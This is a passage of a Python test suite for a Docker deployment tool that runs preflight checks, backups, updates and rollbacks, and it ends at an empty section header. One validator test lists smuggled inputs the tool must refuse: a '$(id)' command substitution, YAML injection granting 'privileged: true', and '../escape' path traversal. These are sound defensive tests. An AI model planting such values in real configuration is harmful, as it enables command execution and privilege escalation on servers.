    assert _server("update", conf, pkg_dir, "--backup-reference", "x") == OP.EXIT_VERIFY


def test_report_of_another_package_is_not_accepted(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    other = tmp_path / "elsewhere" / pkg_dir.name
    shutil.copytree(pkg_dir, other)
    shutil.copy2(
        pkg_dir.parent / "verify-report.json", other.parent / "verify-report.json"
    )
    assert (
        _server("preflight", conf, other, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_health_request_never_goes_through_a_proxy(deployment, monkeypatch):
    """F-26d: http_proxy in root's shell must not break (or leak) the loopback check."""
    conf, _, _ = deployment
    for name in ("http_proxy", "HTTP_PROXY", "all_proxy", "ALL_PROXY"):
        monkeypatch.setenv(name, "http://127.0.0.1:9")
    for name in ("no_proxy", "NO_PROXY"):
        monkeypatch.delenv(name, raising=False)
    assert OP.main(["health", "--config", str(conf)]) == 0


def test_health_url_must_be_loopback(deployment):
    conf, _, _ = deployment
    _set_conf(conf, HEALTH_URL="http://example.com/health")
    assert OP.main(["health", "--config", str(conf)]) == OP.EXIT_UPDATE


# --------------------------------------------------------------------------- #
# preflight
# --------------------------------------------------------------------------- #


def test_preflight_is_read_only(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    before = len(fake_docker.calls())
    assert _server("preflight", conf, pkg_dir, "--backup-reference", "bk-1") == 0
    new = fake_docker.calls()[before:]
    mutating = {"load", "tag", "rm", "rmi", "save", "push", "pull", "run"}
    assert not any(c[0] in mutating for c in new)
    assert not _ups(fake_docker, before)
    _assert_safe_calls(new)
    assert not (Path(str(conf)).parent / "state" / "journal.json").exists()


def test_preflight_fails_closed(deployment, fake_docker):
    conf, pkg_dir, _ = deployment

    def preflight(*extra):
        return _server("preflight", conf, pkg_dir, "--backup-reference", "x", *extra)

    fake_docker.set(jobs=2)
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(jobs=0, schema=32)
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(schema=33, version="1.0.8", versions={})
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(versions={OLD_ID: "1.2.0"})
    assert preflight() == 0
    # was: no backup procedure -> EXIT_PREFLIGHT. Phase 12D5 (R2-04): without BACKUP_CMD
    # the operator's backup is requested by update once it has stopped the writes, so
    # preflight only reports how the backup will be taken (take_backup enforces it).
    assert _server("preflight", conf, pkg_dir) == 0


def test_preflight_requires_recorded_offline_readiness(deployment, fake_docker):
    """F-22: Heron / TableFormer / OCR models / Agri must be usable offline in the
    CURRENT container before it is replaced."""
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["ocr.cli readiness$"])
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )
    rc = _server(
        "preflight",
        conf,
        pkg_dir,
        "--backup-reference",
        "x",
        "--accept-missing-artifacts",
    )
    assert rc == 0


def test_preflight_refuses_a_tag_that_points_to_another_image(deployment, fake_docker):
    """F-25: the package's tag already exists on the server as a different image."""
    conf, pkg_dir, _ = deployment

    def collide(s):
        s["images"][TARGET] = OTHER_ID
        s["image_configs"][OTHER_ID] = OTHER_CONFIG

    fake_docker.edit(collide)
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_preflight_needs_the_database_container(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    fake_docker.edit(lambda s: s["containers"].pop("db1"))
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_preflight_refuses_a_not_ready_package(
    fake_docker, repo, tmp_path, health_server, monkeypatch
):
    fake_docker.edit(
        lambda s: s["inventory"]["runtimes_baked"].update(tiktoken_offline=False)
    )
    pkg, digest = _build(repo, tmp_path)
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    conf = _write_conf(tmp_path, deploy, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )
    assert (
        _server(
            "preflight", conf, pkg_dir, "--backup-reference", "x", "--accept-not-ready"
        )
        == 0
    )


# --------------------------------------------------------------------------- #
# update / finish / rollback
# --------------------------------------------------------------------------- #


def test_update_dry_run_changes_nothing(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    before = len(fake_docker.calls())
    assert _server("update", conf, pkg_dir, "--backup-reference", "bk") == 0
    assert not any(
        c[0] in ("load", "tag") or "up" in c for c in fake_docker.calls()[before:]
    )
    assert not (tmp_path / "state" / "journal.json").exists()


def _approved(tmp_path):
    return json.loads((tmp_path / "state" / "approved.json").read_text())


def test_update_apply_full_flow(deployment, fake_docker, tmp_path):
    """Phase 12D5: quiesce (the APPROVED image in maintenance) -> own backup -> the new
    image with the per-attempt override, in maintenance -> finish moves DEPLOY_IMAGE_TAG
    -> rollback moves it back. No tool file is ever part of the operator's start path."""
    conf, pkg_dir, deploy = deployment
    state = tmp_path / "state"
    start = len(fake_docker.calls())
    assert _apply(conf, pkg_dir) == 0
    calls = fake_docker.calls()[start:]
    _assert_safe_calls(calls)
    kinds = [c[0] for c in calls]
    assert kinds.index("load") < kinds.index("tag")
    tag_call = next(c for c in calls if c[0] == "tag")
    assert tag_call[1] == OLD_ID and tag_call[2].startswith("chatbot5400:rollback-")
    assert not [c for c in calls if c[0] == "tag" and c[-1] == DEPLOY_TAG]  # never by update
    ups = _ups(fake_docker, start)
    assert len(ups) == 2
    quiesce, recreate = ups
    assert any("maintenance" in x for x in quiesce)
    assert not any("override-update" in x for x in quiesce)  # operator files only
    assert any("maintenance" in x for x in recreate)
    assert any(x.endswith("override-update.yml") for x in recreate)
    app = fake_docker.app()
    assert app["image_id"] == IMAGE_ID
    assert app["env"]["OCR_OFFLINE"] == "true" and app["env"]["SURREAL_URL"].startswith(
        "ws://"
    )
    assert app["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"  # maintenance
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID  # a restart returns to it

    journal = _journal(tmp_path)
    assert journal["status"] == "awaiting_approval"
    assert journal["schema"] == 3 and journal["attempt_id"]
    assert journal["expected_image_id"] == IMAGE_ID
    assert journal["baseline"]["image_id"] == OLD_ID
    assert journal["baseline"]["db"]["container_id"] == "db-container-original"
    assert journal["baseline"]["db"]["volumes"] == {"cb_surreal": "2026-10-01T08:00:00Z"}
    assert journal["baseline"]["counts"]["source"] == 120
    assert journal["baseline"]["fingerprint"]["source"]["ids_sha256"]
    assert journal["baseline"]["schema"] == 33
    assert journal["compose_command"][-8:] == SAFE_UP_TAIL
    # two runs (R2-04, Phase 12D5): the first stops the writes and asks for the
    # operator's backup; the second brings its reference, bound to an unchanged F1
    assert [s["step"] for s in journal["steps"]] == [
        "G_load", "H_rollback_tag", "MAINT_intent", "UP_intent", "QUIESCED", "JOBS_idle",
        "F1_fingerprint", "BACKUP_requested",
        "JOBS_idle", "F1_fingerprint", "I_backup", "J_backup_verified", "F2_fingerprint",
        "RAPIDOCR_weights", "ARTIFACTS_snapshot", "F3_fingerprint", "UP_intent",
        "N_recreated", "O_P_checks",
    ]  # fmt: skip
    requested = journal["backup_requested"]["fingerprint_sha256"]
    assert journal["backup"]["fingerprint_sha256"] == requested
    attempt = state / "attempts" / journal["attempt_id"]
    override = (attempt / "override-update.yml").read_text()
    assert override == (
        f'services:\n  open_notebook:\n    image: "{TARGET}"\n    pull_policy: never\n'
    )  # no environment: the operator's files carry it
    records = json.loads((attempt / "records-baseline.json").read_text())
    assert len(records["tables"]["source"]) == 120  # ids only
    assert not (state / "image-override.yml").exists()
    assert _approved(tmp_path)["how"] == "adopted"
    assert _approved(tmp_path)["image_id"] == OLD_ID
    assert (
        deploy / ".env"
    ).read_text() == "SURREAL_PASSWORD=do-not-read\n"  # untouched
    assert (deploy / "docker-compose.yml").read_text() == "services: {}\n"
    assert _status(conf) == OP.EXIT_UNDECIDED  # no drift, but awaiting a decision

    # finish (approval) -> DEPLOY_IMAGE_TAG moves, normal mode with the operator's files only
    assert OP.main(["finish", "--config", str(conf)]) == OP.EXIT_USAGE
    assert _finish(conf) == 0
    last_up = _ups(fake_docker)[-1]
    assert not any("maintenance" in x or "override-update" in x for x in last_up)
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    assert fake_docker.get()["images"][DEPLOY_TAG] == IMAGE_ID
    assert _approved(tmp_path)["how"] == "finish"
    assert _approved(tmp_path)["image_id"] == IMAGE_ID
    journal = _journal(tmp_path)
    assert journal["status"] == "completed" and journal["steps"][-1] == {
        "step": "Q_checks", "ok": True, "at": journal["steps"][-1]["at"],
    }  # fmt: skip
    command = (state / "compose-command.txt").read_text()
    assert "--no-deps --no-build --pull never --force-recreate open_notebook" in command
    assert str(state) not in command.splitlines()[-1]  # no file of the tool
    assert f"approved image {IMAGE_ID}" in command
    assert _status(conf) == 0

    # rollback to the previous image, by its verified ID: the deploy tag follows
    assert _rollback(conf, "app", "--package-dir", str(pkg_dir)) == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _approved(tmp_path)["how"] == "rollback"
    assert _journal(tmp_path)["status"] == "rolled_back"
    _assert_safe_calls(fake_docker.calls()[start:])
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    assert _status(conf) == 0


def test_update_without_backup_refused_then_resumed(deployment, fake_docker, tmp_path):
    """--no-maintenance needs the operator's --writes-stopped-confirmed (R2-20a); a resumed
    run takes its own backup, so it names a new backup reference (R2-04)."""
    conf, pkg_dir, _ = deployment
    rc = _server(
        "update",
        conf,
        pkg_dir,
        "--apply",
        "--no-maintenance",
        "--writes-stopped-confirmed",
        "--backup-reference",
        "x",
    )
    # the reference of the FIRST run names a backup taken before the writes were
    # stopped: refused (R2-04, Phase 12D5); the run asks for the backup instead
    assert rc == OP.EXIT_UPDATE
    journal = _journal(tmp_path)
    assert journal["steps"][-1]["step"] == "BACKUP_requested"
    assert journal["status"] == "in_progress"
    attempt = journal["attempt_id"]
    assert not _ups(fake_docker)
    loads = sum(1 for c in fake_docker.calls() if c[0] == "load")
    rc = _server("update", conf, pkg_dir, "--apply", "--no-maintenance", "--writes-stopped-confirmed",
                 "--backup-reference", "y", "--backup-verified")  # fmt: skip
    assert rc == 0
    assert (
        sum(1 for c in fake_docker.calls() if c[0] == "load") == loads
    )  # resumed, not reloaded
    assert _journal(tmp_path)["attempt_id"] == attempt  # the same transaction


def test_update_lock(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    with OP.update_lock(tmp_path / "state"):
        assert _apply(conf, pkg_dir) == OP.EXIT_LOCK
        assert _rollback(conf) == OP.EXIT_LOCK
        assert _finish(conf) == OP.EXIT_LOCK


def test_failed_health_keeps_maintenance_and_reports(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    # the readiness check fails in the NEW container only
    fake_docker.set(fail_on_image={IMAGE_ID: ["readiness --check"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert _finish(conf) == OP.EXIT_UPDATE  # a failed update cannot be approved
    assert _rollback(conf, "interrupted") == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _journal(tmp_path)["status"] == "rolled_back"


@pytest.mark.parametrize(
    "name", ["evil-db", "evil-app", "evil-env", "evil-volume", "evil-port"]
)
def test_unexpected_config_changes_are_refused(deployment, fake_docker, tmp_path, name):
    """F-12 / F-21: the per-attempt override may change the image and pull_policy of the
    application - nothing else, anywhere (12D3 also allowed its own environment keys)."""
    conf, _, _ = deployment
    dep = OP.Deployment(OP.load_config(str(conf)))
    before = dep.config_json()
    good = OP.write_image_override(dep, "chatbot5400:local", attempt_id="t-1")
    evil = tmp_path / f"{name}.yml"
    evil.write_text("x")
    OP.compare_configs(dep, before, dep.config_json([str(good)]), False)
    with pytest.raises(OP.Refused):
        OP.compare_configs(dep, before, dep.config_json([str(good), str(evil)]), False)


def test_environment_changes_by_a_compose_file_are_refused(deployment, tmp_path):
    """12D5 contract step 2: environment comes from the operator's files only. What the
    12D3 override did (set OCR_* variables) is refused as a configuration change."""
    conf, _, _ = deployment
    dep = OP.Deployment(OP.load_config(str(conf)))
    before = dep.config_json()
    good = OP.write_image_override(dep, "chatbot5400:local", attempt_id="t-1")
    env_file = tmp_path / "env-override.yml"
    env_file.write_text(
        'services:\n  open_notebook:\n    environment:\n      OCR_OFFLINE: "false"\n'
    )
    with pytest.raises(OP.Refused, match="environment"):
        OP.compare_configs(dep, before, dep.config_json([str(good), str(env_file)]), False)


def test_override_values_are_checked_and_quoted(deployment, tmp_path):
    """F-12: every value of the per-attempt override is checked and quoted; it carries NO
    environment (12D5; the 12D3 override wrote the offline variables)."""
    conf, _, _ = deployment
    dep = OP.Deployment(OP.load_config(str(conf)))
    text = OP.render_override("open_notebook", "chatbot5400:1.3.0")
    assert text == (
        'services:\n  open_notebook:\n    image: "chatbot5400:1.3.0"\n    pull_policy: never\n'
    )
    path = OP.write_image_override(dep, "chatbot5400:1.3.0", attempt_id="20261118T000000-abcdef")
    assert path == tmp_path / "state" / "attempts" / "20261118T000000-abcdef" / "override-update.yml"
    assert path.read_text() == text and (path.stat().st_mode & 0o077) == 0
    for image in (
        "chatbot5400:1.3.0\n    privileged: true",
        "a b:c",
        "-x:y",
        "",
        "x:y z",
        'x:"y"',
    ):
        with pytest.raises(OP.Refused):
            OP.write_image_override(dep, image, attempt_id="t-1")
    for env in (
        {"OCR_OFFLINE": "true"},
        {"A": 'x"\n    privileged: "true'},
        {"bad key": "x"},
        {"A": "$(id)"},
    ):
        with pytest.raises(OP.Refused):
            OP.render_override("open_notebook", "chatbot5400:1.3.0", env)
    with pytest.raises(OP.Refused):
        OP.render_override("open notebook:\n  x", "chatbot5400:1.3.0")
    for attempt in (None, "../escape", "a/b"):
        with pytest.raises(OP.Refused):
            OP.write_image_override(dep, "chatbot5400:1.3.0", attempt_id=attempt)
    # shapes a real deployment can report
    for ok in (
        "chatbot5400:local",
        "cb-test-open_notebook",
        "registry.local:5000/team/app:1.2.0",
        IMAGE_ID,
    ):
        OP.check_image_ref(ok)


# --- F-08: every attempt is its own transaction with its own backup ----------


def _with_backup_cmd(conf, tmp_path, verify="true"):
    marker = tmp_path / "backups.log"
    _set_conf(conf, BACKUP_CMD=f"echo backup >> {marker}", BACKUP_VERIFY_CMD=verify)
    return marker


def _backups(marker):
    return marker.read_text().count("backup") if marker.exists() else 0


def test_upgrade_rollback_then_upgrade_again_is_a_new_attempt(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    assert _server("update", conf, pkg_dir, "--apply") == 0
    first = _journal(tmp_path)
    assert _rollback(conf) == 0
    assert _backups(marker) == 1
    # users keep working: the data of the first backup is now stale
    fake_docker.edit(lambda s: s["counts"].update(source=150, note=40))
    assert _server("update", conf, pkg_dir, "--apply") == 0
    second = _journal(tmp_path)
    assert _backups(marker) == 2
    assert second["attempt_id"] != first["attempt_id"]
    assert second["rollback_tag"] != first["rollback_tag"]
    assert second["baseline"]["counts"]["source"] == 150
    assert [s["step"] for s in second["steps"]].count("I_backup") == 1
    archived = list((tmp_path / "state" / "journals").glob("journal-*.json"))
    assert len(archived) == 1
    assert json.loads(archived[0].read_text())["attempt_id"] == first["attempt_id"]
    assert (
        sum(1 for c in fake_docker.calls() if c[0] == "load") == 2
    )  # each attempt loads and identifies the image itself


def test_completed_update_then_next_version(deployment, fake_docker, repo, tmp_path):
    """completed -> a later package: its baseline is the image of the FIRST update,
    it takes its own backup, and its rollback returns to that image, not to v1.2.0.
    The Legal gate is the operator's own configuration (12D5 contract step 2; 12D3 set it
    with `rollback legal-on` in its own override)."""
    conf, pkg_dir, deploy = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _finish(conf) == 0
    fake_docker.edit(
        lambda s: s["config"]["services"]["open_notebook"]["environment"].update(
            OCR_LEGAL_NORMALIZATION_ENABLED="true"
        )
    )  # the operator's gate decision, in the local override
    _plain_compose_up(deploy)  # recreated with the operations script
    assert fake_docker.app()["image_id"] == IMAGE_ID  # the approved image
    assert _backups(marker) == 1

    (repo / "VERSION").write_text("1.3.1\n")
    _git(repo, "commit", "-qam", "1.3.1")
    fake_docker.edit(lambda s: s["inventory"].update(app_version="1.3.1"))
    pkg2, digest2 = _build(
        repo, tmp_path, "--supported-from", "1.3.0", version="1.3.1", out="dist2"
    )
    pkg_dir2 = _unpack_on_server(fake_docker, pkg2, digest2, tmp_path / "pkgx2")
    assert _server("update", conf, pkg_dir2, "--apply") == 0
    journal = _journal(tmp_path)
    assert _backups(marker) == 2
    assert journal["baseline"]["image_id"] == IMAGE_ID
    assert journal["expected_image_id"] == NEXT_ID
    assert fake_docker.app()["image_id"] == NEXT_ID
    # the Legal gate the operator switched on survives the next update
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"
    assert _rollback(conf) == 0
    assert fake_docker.app()["image_id"] == IMAGE_ID
    # the rollback keeps the gate of the image it returns to, and so does the
    # attempt after it (read from the running container, not from the journal)
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"
    assert _server("update", conf, pkg_dir2, "--apply") == 0
    assert _backups(marker) == 3
    assert fake_docker.app()["image_id"] == NEXT_ID
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"


def test_failed_attempt_then_retry_takes_a_new_backup(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.set(fail_on_image={IMAGE_ID: ["readiness --check"]})
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    first = _journal(tmp_path)["attempt_id"]
    # failed and still on the new image: a new update is refused until it is rolled back
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_PREFLIGHT
    assert (
        _server("update", conf, pkg_dir, "--apply", "--allow-version-mismatch")
        == OP.EXIT_UPDATE
    )
    assert _backups(marker) == 1
    assert _rollback(conf, "interrupted") == 0
    fake_docker.set(fail_on_image={})
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _backups(marker) == 2 and _journal(tmp_path)["attempt_id"] != first


def test_resumed_run_takes_its_own_backup(deployment, fake_docker, tmp_path):
    """R2-04: no backup is reused because it is recent (12D3 reused it for
    BACKUP_MAX_AGE_MINUTES): every run that has not recreated the application backs up
    the data as it is then, and the journal binds that backup to its fingerprint F1."""
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.edit(
        lambda s: s["rapidocr"].update(
            copied={"det.onnx": "skipped (checksum mismatch)"}, on_volume=[]
        )
    )
    assert (
        _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    )  # stops before the recreate
    assert _backups(marker) == 1 and not _update_ups(fake_docker)
    attempt = _journal(tmp_path)["attempt_id"]
    # same attempt, minutes later: a NEW backup, of the data as it is now
    assert _server("update", conf, pkg_dir, "--apply", "--accept-missing-rapidocr") == 0
    assert _backups(marker) == 2 and _journal(tmp_path)["attempt_id"] == attempt
    journal = _journal(tmp_path)
    assert [s["step"] for s in journal["steps"]].count("I_backup") == 2
    f1 = [s for s in journal["steps"] if s["step"] == "F1_fingerprint"][-1]["sha256"]
    assert journal["backup"]["fingerprint_sha256"] == f1
    assert journal["backup"]["step"]["fingerprint_sha256"] == f1


def _update_with(conf, pkg_dir, *extra):
    return _server("update", conf, pkg_dir, "--apply", *extra)


def test_an_operator_backup_is_accepted_only_after_the_tool_stopped_the_writes(
    deployment, fake_docker, tmp_path, capsys
):
    """R2-04 (Phase 12D5): a reference passed in the run that has only just stopped the
    writes names a backup taken BEFORE that, while users could still write. Refused and
    burnt; the run asks for the backup (writes stopped, F1 recorded); the next run's NEW
    reference is accepted and bound to that F1."""
    conf, pkg_dir, _ = deployment
    capsys.readouterr()
    assert _update_with(conf, pkg_dir, "--backup-reference", "early", "--backup-verified") == OP.EXIT_UPDATE
    out = capsys.readouterr().out
    assert "taken before this run stopped the writes" in out
    journal = _journal(tmp_path)
    assert journal["steps"][-1]["step"] == "BACKUP_requested"
    assert "I_backup" not in [s["step"] for s in journal["steps"]]
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    # the early backup can never be used later (refused by the preflight of the run)
    assert _update_with(conf, pkg_dir, "--backup-reference", "early", "--backup-verified") == OP.EXIT_PREFLIGHT
    assert "already used" in capsys.readouterr().out
    # the backup taken after the request is accepted and bound to the requested F1
    assert _update_with(conf, pkg_dir, "--backup-reference", "after", "--backup-verified") == 0
    journal = _journal(tmp_path)
    asked = journal["backup_requested"]["fingerprint_sha256"]
    step = journal["backup"]["step"]
    assert step["reference"] == "after" and step["fingerprint_sha256"] == asked
    assert fake_docker.app()["image_id"] == IMAGE_ID


def test_an_operator_backup_is_refused_when_the_data_changed_since_it_was_requested(
    deployment, fake_docker, tmp_path, capsys
):
    """R2-04: between the request and the run that brings the reference somebody wrote
    (an edited note: same ids, same count). The backup may not hold that write: refused,
    nothing recreated, a new backup is requested for the data as it is now."""
    conf, pkg_dir, _ = deployment
    assert _update_with(conf, pkg_dir) == OP.EXIT_UPDATE  # asks for the backup
    first = _journal(tmp_path)["backup_requested"]["fingerprint_sha256"]
    fake_docker.edit(lambda st: st.setdefault("touched", {}).update(note=["note:1"]))
    capsys.readouterr()
    assert _update_with(conf, pkg_dir, "--backup-reference", "b1", "--backup-verified") == OP.EXIT_UPDATE
    assert "the data changed since the backup was requested" in capsys.readouterr().out
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    again = _journal(tmp_path)["backup_requested"]["fingerprint_sha256"]
    assert again != first
    assert _update_with(conf, pkg_dir, "--backup-reference", "b2", "--backup-verified") == 0
    assert _journal(tmp_path)["backup"]["fingerprint_sha256"] == again


def test_an_operator_backup_is_refused_when_the_application_was_recreated_since(
    deployment, fake_docker, tmp_path, capsys
):
    """R2-04: the operator's script put the application back into normal mode between the
    request and the reference (users could write): refused, the writes are stopped again."""
    conf, pkg_dir, deploy = deployment
    assert _update_with(conf, pkg_dir) == OP.EXIT_UPDATE
    _plain_compose_up(deploy)  # normal mode, approved image, a new container
    capsys.readouterr()
    assert _update_with(conf, pkg_dir, "--backup-reference", "b1", "--backup-verified") == OP.EXIT_UPDATE
    assert "recreated since the backup was requested" in capsys.readouterr().out
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    assert _update_with(conf, pkg_dir, "--backup-reference", "b2", "--backup-verified") == 0


def test_resume_takes_a_new_backup_when_the_old_one_is_too_old(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.edit(lambda s: s["rapidocr"].update(copied={}, on_volume=[]))
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    _set_conf(conf, BACKUP_MAX_AGE_MINUTES="0")
    assert _server("update", conf, pkg_dir, "--apply", "--accept-missing-rapidocr") == 0
    assert _backups(marker) == 2


def test_closing_an_attempt_that_recreated_nothing_returns_to_normal_mode(
    deployment, fake_docker, tmp_path
):
    """An attempt that stopped before the NEW image ran is closed without it: the
    approved image it put into maintenance for the backup (12D5 quiesce) goes back to
    normal mode, the deploy tag is not touched. (12D3 had no quiesce: nothing to undo.)"""
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path, verify="exit 4")
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE  # stops at J
    assert fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert _status(conf) == OP.EXIT_UNDECIDED
    ups = len(_ups(fake_docker))
    assert _rollback(conf, "interrupted") == 0
    assert not _update_ups(fake_docker)  # the new image never ran
    assert len(_ups(fake_docker)) == ups + 1  # one recreate: back to normal mode
    assert not any("maintenance" in x or "override-update" in x for x in _ups(fake_docker)[-1])
    assert fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _status(conf) == 0
    journal = _journal(tmp_path)
    assert journal["status"] == "rolled_back"
    assert journal["steps"][-1]["step"] == "ROLLBACK_nothing_recreated"
    _set_conf(conf, BACKUP_VERIFY_CMD="true")
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert (
        _backups(marker) == 2
        and _journal(tmp_path)["attempt_id"] != journal["attempt_id"]
    )


def test_state_directory_and_journal_are_private(deployment, tmp_path):
    """Journal, approved deployment, per-attempt override, record ids, model hashes,
    trusted verify records, backup references: all private to root."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    attempt = state / "attempts" / _journal(tmp_path)["attempt_id"]
    assert {p.name for p in attempt.iterdir()} >= {
        "override-update.yml", "records-baseline.json", "artifacts.json",
    }  # fmt: skip
    for d in (state, state / "attempts", attempt, state / "verified"):
        assert (d.stat().st_mode & 0o077) == 0, d
    names = ("journal.json", "journal.json.bak", "approved.json", "approved.json.bak",
             "backup-references.json")  # fmt: skip
    files = [state / n for n in names] + list(attempt.iterdir())
    files += list((state / "verified").iterdir())
    for path in files:
        assert (path.stat().st_mode & 0o077) == 0, path


def test_incomplete_backup_stops_the_update(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    _set_conf(conf, BACKUP_CMD="exit 3", BACKUP_VERIFY_CMD="true")
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    marker = _with_backup_cmd(conf, tmp_path, verify="exit 4")  # restore check fails
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and _backups(marker) == 1
    assert "J_backup_verified" not in [s["step"] for s in _journal(tmp_path)["steps"]]


def test_undecided_update_blocks_a_new_one(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0  # awaiting approval
    loads = sum(1 for c in fake_docker.calls() if c[0] == "load")
    assert _apply(conf, pkg_dir, "--allow-version-mismatch") == OP.EXIT_PREFLIGHT
    assert sum(1 for c in fake_docker.calls() if c[0] == "load") == loads
    assert _journal(tmp_path)["status"] == "awaiting_approval"


def test_another_package_cannot_take_over_an_unfinished_attempt(
    deployment, fake_docker, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    rc = _server("update", conf, pkg_dir, "--apply", "--backup-reference", "x")
    assert rc == OP.EXIT_UPDATE  # in progress (restore not verified)
    (repo / "README.md").write_text("changed\n")
    _git(repo, "commit", "-qam", "another build")
    fake_docker.edit(
        lambda s: (
            s["images"].update({TARGET: IMAGE_ID}),
            s["image_configs"].update({IMAGE_ID: NEW_CONFIG}),
        )
    )
    pkg2, digest2 = _build(repo, tmp_path, out="dist2")
    pkg_dir2 = _unpack_on_server(fake_docker, pkg2, digest2, tmp_path / "pkgx2")
    assert _apply(conf, pkg_dir2) == OP.EXIT_PREFLIGHT
    assert _journal(tmp_path)["manifest_sha256"] == OP.sha256_file(
        pkg_dir / "manifest.json"
    )


def test_journal_of_the_previous_tool_version(deployment, fake_docker, tmp_path):
    """An old journal (no attempt id, no baseline) is archived, never trusted."""
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)  # verify already recorded its trusted result there
    old = {
        "version": "1.3.0-rc.1", "status": "rolled_back", "previous_image": OTHER_ID,
        "rollback_tag": "chatbot5400:rollback-old",
        "steps": [{"step": "G_load"}, {"step": "I_backup", "at": "2026-11-01T10:00:00"},
                  {"step": "J_backup_verified", "at": "2026-11-01T10:05:00"}],
    }  # fmt: skip
    (state / "journal.json").write_text(json.dumps(old))
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _backups(marker) == 1  # the old journal's backup was NOT reused
    journal = _journal(tmp_path)
    assert (
        journal["baseline"]["image_id"] == OLD_ID
        and journal["rollback_tag"] != "chatbot5400:rollback-old"
    )
    assert len(list((state / "journals").glob("*.json"))) == 1


def test_old_journal_awaiting_approval_is_not_finished_blindly(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    (state / "journal.json").write_text(
        json.dumps(
            {"version": "1.3.0-rc.1", "status": "awaiting_approval", "steps": []}
        )
    )
    assert _finish(conf) == OP.EXIT_UPDATE  # no image id recorded: cannot be confirmed
    assert _apply(conf, pkg_dir) == OP.EXIT_PREFLIGHT
    assert _rollback(conf) == OP.EXIT_UPDATE  # no baseline: an explicit image is needed
    # no baseline and no approved deployment: the operator vouches for it (R2-20b)
    assert _rollback(conf, "app", "--to-image", "chatbot5400:local") == OP.EXIT_UPDATE
    assert _rollback(conf, "app", "--to-image", "chatbot5400:local", "--force-image") == 0
    assert _journal(tmp_path)["status"] == "rolled_back"


# --- F-24: rollback by verified image ID -------------------------------------


